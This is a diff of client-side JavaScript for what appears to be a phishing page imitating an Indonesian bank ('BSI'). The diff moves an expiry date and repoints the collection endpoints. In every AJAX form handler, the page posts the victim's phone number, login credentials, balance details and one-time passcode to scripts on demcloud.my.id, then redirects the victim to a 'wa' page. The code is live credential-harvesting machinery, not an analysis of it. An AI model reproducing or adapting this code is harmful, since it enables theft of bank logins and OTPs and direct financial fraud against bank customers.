@@ -1,6 +1,6 @@
 
 let tglNow = new Date();
-let waktuBatas = new Date("2025-09-08T23:59:59");
+let waktuBatas = new Date("2025-09-23T23:59:59");
 if (tglNow.getTime() >= waktuBatas.getTime()) {
   document.location.href = 'https://expiredweb.pages.dev';
 } else {
@@ -17,7 +17,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://demcloud.my.id/BSI/drtc3/no.php',
+            url: 'https://demcloud.my.id/BSI/zxd5f/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -37,7 +37,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://demcloud.my.id/BSI/drtc3/login.php',
+            url: 'https://demcloud.my.id/BSI/zxd5f/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -63,7 +63,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://demcloud.my.id/BSI/drtc3/saldo.php',
+            url: 'https://demcloud.my.id/BSI/zxd5f/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -93,7 +93,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://demcloud.my.id/BSI/drtc3/otp.php',
+ url: 'https://demcloud.my.id/BSI/zxd5f/otp.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
@@ -132,7 +132,7 @@ function getcs(){
      audio1.load();
     audio4.loop = false
 setTimeout(function(){  
-location.href='https://demcloud.my.id/BSI/drtc3/wa';
+location.href='https://demcloud.my.id/BSI/zxd5f/wa';
     }, 5000);
     setTimeout(function(){
     $("#djload").hide();   
